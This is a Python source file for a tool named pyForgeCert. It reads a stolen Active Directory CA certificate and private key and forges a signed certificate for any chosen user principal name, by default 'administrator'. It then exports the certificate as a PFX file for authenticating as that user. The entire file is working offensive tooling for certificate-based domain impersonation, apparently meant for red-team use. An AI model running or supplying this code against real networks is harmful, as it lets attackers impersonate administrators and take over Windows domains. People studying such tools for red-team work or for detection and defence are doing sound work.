import binascii
import datetime
import os
import sys
import argparse
import random
import string
from typing import cast
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.x509.oid import ExtensionOID
from cryptography.hazmat.primitives import hashes
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives.serialization import pkcs12, BestAvailableEncryption

from OpenSSL import crypto


def log():
    log = """
·▄▄▄      ▄▄▄   ▄▄ • ▄▄▄ . ▄▄· ▄▄▄ .▄▄▄  ▄▄▄▄▄
▐▄▄·▪     ▀▄ █·▐█ ▀ ▪▀▄.▀·▐█ ▌▪▀▄.▀·▀▄ █·•██  
██▪  ▄█▀▄ ▐▀▀▄ ▄█ ▀█▄▐▀▀▪▄██ ▄▄▐▀▀▪▄▐▀▀▄  ▐█.▪
██▌.▐█▌.▐▌▐█•█▌▐█▄▪▐█▐█▄▄▌▐███▌▐█▄▄▌▐█•█▌ ▐█▌·
▀▀▀  ▀█▄▀▪.▀  ▀·▀▀▀▀  ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀ ▀▀▀ 
"""
    return log

def print_cert_info(header, cert_decoded):
    try:
        subname = ""
        se_nu = ""
        try:
            se_nu = "{}".format(cert_decoded.serial_number)
            fingerprint = binascii.hexlify(cert_decoded.fingerprint(hashes.SHA256())).decode('utf-8')
            alt_name = cert_decoded.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
            san_ext_value = cast(x509.SubjectAlternativeName, alt_name.value)
            subj_alt_names = san_ext_value.get_values_for_type(x509.OtherName)[0].value
            subname = subj_alt_names[2:].decode('utf-8')
        except Exception as e:
            pass
        cert_data = "{}\n  Subject: {}\n  Issuer: {}\n  Start Date: {}\n  End Date: {}\n  Fingerprint: {} \n  Serial: {}".format(header, cert_decoded.subject.rfc4514_string(), cert_decoded.issuer.rfc4514_string(), cert_decoded.not_valid_before, cert_decoded.not_valid_after, fingerprint,cert_decoded.serial_number)
        if subname:
            cert_data = cert_data + "\n  SubjectAltName: {}".format(subname)
        print(cert_data)
        return se_nu
    except Exception as e:
        raise Exception(e)


def generate_certificate(cert_decoded, subject, private_key, public_key, ldap_uri, subjectaltname, serialnumber):
    one_day = datetime.timedelta(1, 0, 0)
    builder = x509.CertificateBuilder()
    builder = builder.issuer_name(cert_decoded.issuer)
    builder = builder.subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, subject), ]))
    builder = builder.not_valid_before(datetime.datetime.today() - one_day)
    builder = builder.not_valid_after(datetime.datetime.today() + (one_day * 365))
    if serialnumber:
        builder = builder.serial_number(int(serialnumber))
    else:
        builder = builder.serial_number(x509.random_serial_number())
    builder = builder.public_key(public_key)
    alt_names = []
    upn_oid = x509.ObjectIdentifier('1.3.6.1.4.1.311.20.2.3')
    user_upn = subjectaltname.encode()
    b_upn = b"\x0C" + bytes([len(user_upn)]) + bytes(user_upn)
    alt_names.append(x509.OtherName(upn_oid, b_upn))
    builder = builder.add_extension(x509.SubjectAlternativeName(alt_names), critical=False)
    builder = builder.add_extension(x509.AuthorityKeyIdentifier(key_identifier=cert_decoded.public_bytes(serialization.Encoding.DER),
                                                                authority_cert_issuer=None, authority_cert_serial_number=None), critical=False)
    if len(ldap_uri) > 0:
        crl_dp = x509.DistributionPoint(
            [x509.UniformResourceIdentifier(ldap_uri)],
            relative_name=None,
            reasons=None,
            crl_issuer=None,
        )
        builder = builder.add_extension(x509.CRLDistributionPoints([crl_dp]), critical=False)
    certificate = builder.sign(private_key=private_key, algorithm=hashes.SHA256(),)
    return certificate


def generate_pfx(private, cert, password):
    # pem_cert = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
    # certificate = crypto.load_certificate(crypto.FILETYPE_PEM, pem_cert)
    # p12 = crypto.PKCS12()
    # p12.set_certificate(certificate)
    # p12.set_privatekey(private)
    # pfx = p12.export(password)
    # return pfx
    pfx = pkcs12.serialize_key_and_certificates(
        name=b"",
        key=private,
        cert=cert,
        cas=None,
        encryption_algorithm=BestAvailableEncryption(password),
    )
    return pfx


def main():
    parser = argparse.ArgumentParser(add_help=True, description='pyForgeCert')
    parser.add_argument("-i", "--input", required=True, help="Input file, default (PEM).")
    parser.add_argument("-p", "--ipassword", required=False, default="", help="Password to the CA private key file.(PFX file).")
    parser.add_argument("-s", "--subject", required=False, choices=['User', 'Computer','Administrator','DomainController'], default="User", help="Subject name in the certificate.")
    parser.add_argument("-a", "--altname", required=False, default="administrator", help="UPN of the user to authenticate as.")
    parser.add_argument("-o", "--output", required=True, help="Path where to save the new .pfx certificate.")
    parser.add_argument("-se", "--serial", required=False, default=None, help="Serial number for the forged certificate.")
    parser.add_argument("-op", "--opassword", required=False, default="RAND", help="Password to the .pfx file.")
    parser.add_argument("-c", "--crl", required=False, help="Ldap path to a CRL for the forged certificate.")
    parser.add_argument('-pfx', action='store_true', help='If the input file is PFX.')
    print(log())
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    input_file = options.input
    if not os.path.exists(input_file):
        print("[-] In put file not exists.")
        sys.exit(1)
    with open(input_file, 'rb') as f:
        data = f.read()
    cert_decoded = ""
    try:
        if options.pfx:
            private_key, cert, additional_certificates = pkcs12.load_key_and_certificates(
                data,
                options.ipassword.encode()
            )
            cert_decoded = cert
            key = private_key
        else:
            cert_decoded = x509.load_pem_x509_certificate(data, default_backend())
            key = load_pem_private_key(data, None, default_backend())
    except Exception as e:
        print("Read file error: {}".format(e))
        sys.exit(1)
    serial_number = print_cert_info("CA Certificate Information:", cert_decoded)
    if options.serial:
        se_nu = options.serial
    else:
        se_nu = serial_number
    private_key = crypto.PKey()
    private_key.generate_key(crypto.TYPE_RSA, 4096)
    crypto_pri_key = private_key.to_cryptography_key()
    public_key = crypto_pri_key.public_key()
    if options.crl:
        ldap_uri = options.crl
    else:
        ldap_uri = ""
    new_cert = generate_certificate(cert_decoded, options.subject, key, public_key, ldap_uri, options.altname, se_nu)
    print_cert_info("\nForged Certificate Information:", new_cert)
    if options.opassword == "RAND":
        password = ''.join(random.choice(string.ascii_letters) for _ in range(8))
    else:
        password = options.opassword
    certificate_store = generate_pfx(crypto_pri_key, new_cert, password.encode())
    out_put = options.output
    with open(out_put, "wb") as f:
        f.write(certificate_store)
    if os.path.exists(out_put):
        print("\n[+] Export to file Success, PFX file {} with password  {} ".format(out_put, password))


if __name__ == "__main__":
    main()


